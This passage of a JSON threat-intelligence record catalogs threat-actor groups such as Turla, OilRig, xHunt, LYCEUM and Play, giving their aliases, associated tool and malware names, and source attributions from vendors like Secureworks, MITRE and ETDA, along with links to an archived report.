                "Kotel",
                "LOLBAS",
                "LOLBins",
                "LightNeuron",
                "Living off the Land",
                "Maintools.js",
                "Metasploit",
                "Meterpreter",
                "MiamiBeach",
                "Mimikatz",
                "MiniDionis",
                "Minit",
                "NBTscan",
                "NETTRANS",
                "NETVulture",
                "Neptun",
                "NetFlash",
                "NewPass",
                "Outlook Backdoor",
                "Penquin Turla",
                "Pfinet",
                "PowerShell Empire",
                "PowerShellRunner",
                "PowerShellRunner-based RPC backdoor",
                "PowerStallion",
                "PsExec",
                "PyFlash",
                "QUIETCANARY",
                "Reductor RAT",
                "RocketMan",
                "SMBTouch",
                "SScan",
                "Satellite Turla",
                "SilentMoon",
                "Sun rootkit",
                "TTNG",
                "TadjMakhal",
                "Tavdig",
                "TinyTurla",
                "TinyTurla Next Generation",
                "TinyTurla-NG",
                "Topinambour",
                "Tunnus",
                "Turla",
                "Turla SilentMoon",
                "TurlaChopper",
                "Uroburos",
                "Urouros",
                "WCE",
                "WITCHCOVEN",
                "WhiteAtlas",
                "WhiteBear",
                "Windows Credential Editor",
                "Windows Credentials Editor",
                "Wipbot",
                "WorldCupSec",
                "XTRANS",
                "certutil",
                "certutil.exe",
                "gpresult",
                "nbtscan",
                "nbtstat",
                "pwdump"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8f9c8a6e-f6b6-431b-bedd-94fdeea5474a",
            "created_at": "2024-05-01T02:03:08.022974Z",
            "updated_at": "2025-03-27T02:05:17.310877Z",
            "deleted_at": null,
            "main_name": "COBALT GYPSY",
            "aliases": [
                "CHRYSENE ",
                "Crambus ",
                "EUROPIUM ",
                "Hazel Sandstorm ",
                "Helix Kitten ",
                "ITG13 ",
                "OilRig ",
                "Yellow Maero ",
                "APT34 "
            ],
            "source_name": "Secureworks:COBALT GYPSY",
            "tools": [
                " Helminth",
                " Jason",
                " MacDownloader",
                " PoisonFrog",
                " RGDoor",
                " ThreeDollars",
                " TinyZbot",
                " Toxocara",
                " Trichuris",
                " TwoFace",
                "Glimpse"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8aaa5515-92dd-448d-bb20-3a253f4f8854",
            "created_at": "2024-06-19T02:03:08.147099Z",
            "updated_at": "2025-03-27T02:05:17.408118Z",
            "deleted_at": null,
            "main_name": "IRON HUNTER",
            "aliases": [
                "Belugasturgeon ",
                "Blue Python ",
                "CTG-8875 ",
                "ITG12 ",
                "KRYPTON ",
                "MAKERSMARK ",
                "Pensive Ursa ",
                "Secret Blizzard ",
                "Turla",
                "UAC-0003 ",
                "UAC-0024 ",
                "UNC4210 ",
                "Venomous Bear ",
                "Waterbug ",
                "ATK13 "
            ],
            "source_name": "Secureworks:IRON HUNTER",
            "tools": [
                " ComRAT",
                " Kazuar",
                " KopiLuwak",
                " LightNeuron",
                " Mosquito",
                " Nautilus",
                " Neuron",
                " Penquin",
                " PoisonFrog",
                " PyFlash",
                " Skipper",
                " Snake",
                " Tavdig",
                " TinyTurla",
                " Tunnus",
                "Carbon-DLL"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "dc74686b-db66-426a-95bb-d4ce8ef7e967",
            "created_at": "2024-05-01T02:03:08.033074Z",
            "updated_at": "2025-03-27T02:05:17.31649Z",
            "deleted_at": null,
            "main_name": "COBALT KATANA",
            "aliases": [
                "SectorD01 ",
                "xHunt campaign ",
                "Hive0081 "
            ],
            "source_name": "Secureworks:COBALT KATANA",
            "tools": [
                " Diezen",
                " Eye",
                " Gon",
                " Hisoka",
                " Hisoka Netero",
                " HyphenShell",
                " Killua",
                " Sakabota",
                " Sakabota Framework",
                "CASHY200"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "a97fee0d-af4b-4661-ae17-858925438fc4",
            "created_at": "2023-01-06T13:46:38.396415Z",
            "updated_at": "2025-03-27T02:00:02.823045Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Uroburos",
                "Hippo Team",
                "Pacifier APT",
                "MAKERSMARK",
                "ATK13",
                "UAC-0003",
                "IRON HUNTER",
                "Waterbug",
                "TAG_0530",
                "KRYPTON",
                "Popeye",
                "SIG23",
                "UAC-0144",
                "G0010",
                "Blue Python",
                "VENOMOUS Bear",
                "Group 88",
                "Pfinet",
                "ITG12",
                "UNC4210",
                "Secret Blizzard",
                "UAC-0024"
            ],
            "source_name": "MISPGALAXY:Turla",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "fb8f3a5f-01a9-498e-9396-52f844424c33",
            "created_at": "2023-01-06T13:46:39.045338Z",
            "updated_at": "2025-03-27T02:00:02.984648Z",
            "deleted_at": null,
            "main_name": "LYCEUM",
            "aliases": [
                "siamesekitten",
                "Chrono Kitten",
                "Storm-0133",
                "COBALT LYCEUM",
                "UNC1530",
                "Spirlin",
                "MYSTICDOME"
            ],
            "source_name": "MISPGALAXY:LYCEUM",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "20bc5b83-9ea0-4e60-a23e-19bf203dc9fb",
            "created_at": "2022-10-25T16:07:24.432777Z",
            "updated_at": "2025-03-27T02:02:10.220082Z",
            "deleted_at": null,
            "main_name": "xHunt",
            "aliases": [
                "Cobalt Katana",
                "Hive0081",
                "Hunter Serpens",
                "SectorD01"
            ],
            "source_name": "ETDA:xHunt",
            "tools": [
                "CASHY200",
                "COLDTRAIN",
                "Gon",
                "Hisoka",
                "Killua",
                "Netero",
                "SHELLSTING",
                "Sakabota",
                "Snugy",
                "TriFive"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d11c89bb-1640-45fa-8322-6f4e4053d7f3",
            "created_at": "2022-10-25T15:50:23.509601Z",
            "updated_at": "2025-03-27T02:00:55.487991Z",
            "deleted_at": null,
            "main_name": "Turla",
            "aliases": [
                "Turla",
                "IRON HUNTER",
                "Group 88",
                "Waterbug",
                "WhiteBear",
                "Krypton",
                "Venomous Bear",
                "Secret Blizzard",
                "BELUGASTURGEON"
            ],
            "source_name": "MITRE:Turla",
            "tools": [
                "PsExec",
                "nbtstat",
                "ComRAT",
                "netstat",
                "certutil",
                "KOPILUWAK",
                "IronNetInjector",
                "LunarWeb",
                "Arp",
                "Uroburos",
                "PowerStallion",
                "Kazuar",
                "Systeminfo",
                "LightNeuron",
                "Mimikatz",
                "Tasklist",
                "LunarMail",
                "HyperStack",
                "NBTscan",
                "TinyTurla",
                "Penquin",
                "LunarLoader"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "b6436f7b-6012-4969-aed1-d440e2e8b238",
            "created_at": "2022-10-25T16:07:23.91517Z",
            "updated_at": "2025-03-27T02:02:10.027531Z",
            "deleted_at": null,
            "main_name": "OilRig",
            "aliases": [
                "APT 34",
                "ATK 40",
                "Chrysene",
                "Cobalt Gypsy",
                "Crambus",
                "DEV-0861",
                "EUROPIUM",
                "Earth Simnavaz",
                "Evasive Serpens",
                "Hazel Sandstorm",
                "Helix Kitten",
                "IRN2",
                "ITG13",
                "Scarred Manticore",
                "Storm-0861",
                "TA452",
                "Twisted Kitten",
                "UNC1860",
                "Yellow Maero"
            ],
            "source_name": "ETDA:OilRig",
            "tools": [
                "AMATIAS",
                "Agent Drable",
                "Agent Injector",
                "AgentDrable",
                "Alma Communicator",
                "BONDUPDATER",
                "CACTUSPIPE",
                "Clayslide",
                "CypherRat",
                "DNSExfitrator",
                "DNSpionage",
                "DROPSHOT",
                "DistTrack",
                "DropperBackdoor",
                "Fox Panel",
                "GREYSTUFF",
                "GoogleDrive RAT",
                "HighShell",
                "HyperShell",
                "ISMAgent",
                "ISMDoor",
                "ISMInjector",
                "Jason",
                "Karkoff",
                "LIONTAIL",
                "LOLBAS",
                "LOLBins",
                "LONGWATCH",
                "LaZagne",
                "Living off the Land",
                "MailDropper",
                "Mimikatz",
                "MrPerfectInstaller",
                "OILYFACE",
                "OopsIE",
                "POWBAT",
                "POWRUNER",
                "Plink",
                "Poison Frog",
                "PowerExchange",
                "PsList",
                "PuTTY Link",
                "QUADAGENT",
                "RDAT",
                "RGDoor",
                "SEASHARPEE",
                "Saitama",
                "Saitama Backdoor",
                "Shamoon",
                "SideTwist",
                "SpyNote",
                "SpyNote RAT",
                "StoneDrill",
                "TONEDEAF",
                "TONEDEAF 2.0",
                "ThreeDollars",
                "TwoFace",
                "VALUEVAULT",
                "Webmask",
                "WinRAR",
                "ZEROCLEAR",
                "ZeroCleare",
                "certutil",
                "certutil.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716490,
    "ts_updated_at": 1743041847,
    "ts_creation_date": 1574707301,
    "ts_modification_date": 1574707301,
    "files": {
        "pdf": "https://archive.orkl.eu/a93d869bc0d4893c042f91e40e777d72db92a77e.pdf",
        "text": "https://archive.orkl.eu/a93d869bc0d4893c042f91e40e777d72db92a77e.txt",
        "img": "https://archive.orkl.eu/a93d869bc0d4893c042f91e40e777d72db92a77e.jpg"
    }
}